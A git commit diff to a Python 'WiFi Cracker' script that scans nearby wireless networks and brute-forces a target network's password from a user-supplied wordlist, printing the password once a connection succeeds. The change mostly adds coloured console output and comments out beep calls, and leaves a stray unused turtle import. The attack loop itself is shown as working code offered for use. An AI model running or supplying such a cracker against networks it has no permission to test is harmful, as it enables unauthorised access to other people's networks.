5166f7954018e157bba243bd54870ec572c7a17e
Mahan <100639461+MhnXp@users.noreply.github.com>
2022-04-29 02:49:15 +0430

    Add files via upload

--- WiFi Cracker/wifi-cracker.py
+++ WiFi Cracker/wifi-cracker.py
@@ -1,10 +1,12 @@
+from turtle import color
 from pywifi import const, PyWiFi ,Profile
 from time import sleep
 from winsound import Beep # just for Windows
 import os
+from colorama import Fore as color
 
 os.system("cls")
-print("""
+print(color.RED+"""
  __   __ _          __  __      
  |  \/  | |__  _ __ \ \/ /_ __  
  | |\/| | '_ \| '_ \ \  /| '_ \ 
@@ -12,26 +14,26 @@ print("""
  |_|  |_|_| |_|_| |_/_/\_\ .__/ 
                          |_|     version 1.0""")
 sleep(0.1)
-print("""
+print(color.RED+"""
 ------------------------------------------------------
 |||           Developer: MahanXp              |||
 |||           Contact: Tel: @MaHaN_UniQuE     |||               
 ------------------------------------------------------             
 """)
 sleep(0.1)
-print("[1]--Cracker WiFi")
+print(color.LIGHTRED_EX+"[1]--Cracker WiFi")
 sleep(0.1)
 print('')
-print("[2]--LOGOUT")
+print(color.LIGHTRED_EX+"[2]--LOGOUT")
 sleep(0.1)
 print("")
 
 
-number = input("[Number >>> ")
+number = input(color.GREEN+"[Number >>> ")
 
 if "1" in number:
 
-    print("<< Hello WelCome To Cracker WiFi >>")
+    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
 
     def scan(): # For Scan the area
         interface.scan()
@@ -59,11 +61,11 @@ if "1" in number:
             
     wifi = PyWiFi() # Wifi Object
     interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
-    print("< Enter The List Password Name To Crack PassWord >")
-    print("<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
-    passlist = input("<<Enter The PassWord List To Crack WiFi : ") # Password List
+    print(color.LIGHTMAGENTA_EX+"< Enter The List Password Name To Crack PassWord >")
+    print(color.LIGHTMAGENTA_EX+"<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
+    passlist = input(color.LIGHTMAGENTA_EX+"<<Enter The PassWord List To Crack WiFi : ") # Password List
 
-    print("<<Scanning ... ")
+    print(color.GREEN+"<<Scanning ... ")
     APs = scan()
 
     for i in range(len(APs)):
@@ -74,15 +76,16 @@ if "1" in number:
 
     for password in open(passlist):
         password = password.strip("\n")
-        print("Testing : {}".format(password))
+        print(color.RED+"Testing : {}".format(password))
         if testwifi(target.ssid , password) : # Test for connection using password
-            Beep(700 , 500) # Boooooghhh (just for windows)
-            Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
+            # Beep(700 , 500) # Boooooghhh (just for windows)
+            # Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
             print("-" *30)
-            print("PASSWORD : {}".format(password))
+            print(color.GREEN+"PASSWORD : {}".format(password))
             print("-" *30)
             break
 
-    input()   
+    input()  
+
 if "2" in number:
     print("Good Bay ...")
